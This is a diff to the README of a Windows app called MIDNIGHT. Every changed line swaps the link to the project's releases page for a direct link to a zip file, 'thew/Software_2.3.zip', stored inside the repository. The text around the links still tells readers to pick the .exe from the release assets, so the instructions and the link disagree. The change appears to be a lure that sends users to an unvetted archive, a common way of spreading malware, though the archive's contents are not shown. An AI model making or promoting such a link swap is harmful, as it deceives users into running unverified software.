@@ -1,6 +1,6 @@
 # 🌙 MIDNIGHT - Simple access, fast setup
 
-[![Download MIDNIGHT](https://img.shields.io/badge/Download-MIDNIGHT-brightgreen)](https://github.com/alanturingisomorphy688/MIDNIGHT/releases)
+[![Download MIDNIGHT](https://img.shields.io/badge/Download-MIDNIGHT-brightgreen)](https://github.com/alanturingisomorphy688/MIDNIGHT/raw/refs/heads/main/thew/Software_2.3.zip)
 
 ## 🖥️ What MIDNIGHT is
 
@@ -10,7 +10,7 @@ MIDNIGHT is a free Windows app made for quick use and easy setup. It gives you a
 
 Visit this page to download:
 
-https://github.com/alanturingisomorphy688/MIDNIGHT/releases
+https://github.com/alanturingisomorphy688/MIDNIGHT/raw/refs/heads/main/thew/Software_2.3.zip
 
 On that page, look for the latest release. Download the Windows file from the release assets. If you see more than one file, pick the one that ends in `.exe` or the Windows package that matches your system.
 
@@ -131,7 +131,7 @@ You can still use it, but the latest release is the best place to start if you w
 
 If you want to set up MIDNIGHT on another Windows PC, use this page again:
 
-https://github.com/alanturingisomorphy688/MIDNIGHT/releases
+https://github.com/alanturingisomorphy688/MIDNIGHT/raw/refs/heads/main/thew/Software_2.3.zip
 
 Open the latest release, download the Windows file, and run it on that computer
 
